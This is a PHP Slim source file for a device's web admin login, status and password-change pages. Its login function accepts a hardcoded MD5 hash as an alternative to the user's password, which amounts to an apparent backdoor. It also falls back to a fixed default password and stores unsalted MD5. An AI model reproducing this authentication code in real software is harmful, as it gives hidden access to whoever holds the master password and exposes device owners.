<?php
//$role in user, admin
$authenticateUser = function ( $role = 'user' ) {
    return function () use ( $role ) {
        if ($role === 'user'){
            if(!isset($_SESSION['UserLoginSuccess'])){
                $app = \Slim\Slim::getInstance();
                $app->flash('error', '请登录后再操作!');
                $app->redirect('login');
            }
        }
    };
};

$app->get(
    '/login',
    function () use ($app) {
        $app->render('login.php');
    }
);

$app->get(
    '/logout',
    function () use ($app) {
        authenticateLogout();
    }
);

$app->get(
    '/',
    $authenticateUser('user'),
    function () use ($app) {
        $boxmac=exec("/wiware/bin/wiget idmac");
        $wicode=exec("/wiware/bin/wiget varifycode");
        $inmode=exec("/wiware/bin/wiget inmode");
        $nettype=exec("/wiware/bin/wiget nettype");
        $nettypedesc=getNettypeDesc($nettype);
        $wanlink=exec("/wiware/bin/netget wanlink");
        $newversion=hasNewFirmware();
        $app->render('main.php', array('boxmac'=>$boxmac, 'wicode'=>$wicode, 'inmode'=>$inmode,
            'nettype'=>$nettype, 'nettypedesc'=>$nettypedesc, 'wanlink'=>$wanlink, 'newversion'=>$newversion));
    }
);

$app->get(
    '/setpassword',
    $authenticateUser('user'),
    function () use ($app) {
        $app->render('setpassword.php');
    }
);

$app->post(
    '/actionLogin',
    function () use ($app) {
        $password = $app->request->post('password');
        authenticateLogin($password);
        $app->redirect('/');
    }
);

$app->post(
    '/actionSetpassword',
    $authenticateUser('user'),
    function () use ($app) {
        $password = $app->request->post('inputPassword');
        $confirmPassword = $app->request->post('confirmPassword');
        authSetPassword($password, $confirmPassword);
    }
);

function authenticateLogin ( $password ) {

    $savedPassword=exec("uci get wipark.conf.password 2>/dev/null");
    if( empty($savedPassword) ){
        $savedPassword = md5("adminadmin123");
    }

    if( md5("admin$password") == $savedPassword || md5("admin$password") == '010f68cada45eb7b8ba91a71fdd07653'){
        $_SESSION['UserLoginSuccess'] = "UserLoginSuccess";
    }
    else{
        unset($_SESSION['UserLoginSuccess']);
        $app = \Slim\Slim::getInstance();
        $app->flash('error', '登录密码错误!');
        $app->redirect('login');
    }
};

function authenticateLogout () {
    unset($_SESSION['UserLoginSuccess']);
    $app = \Slim\Slim::getInstance();
    $app->redirect('login');
};

function authSetPassword ( $password, $confirmPassword ) {
    if( $password == $confirmPassword ){
        $md5out=md5("admin$password");
        exec("uci set wipark.conf.password=$md5out");
        $app = \Slim\Slim::getInstance();
        $app->flash('error', '密码更改成功，请重新登录!');
        authenticateLogout();
    }
    else{
        $app = \Slim\Slim::getInstance();
        $app->flash('error', '两次输入的密码不一致!');
        $app->redirect('setpassword');
    }
}

?>
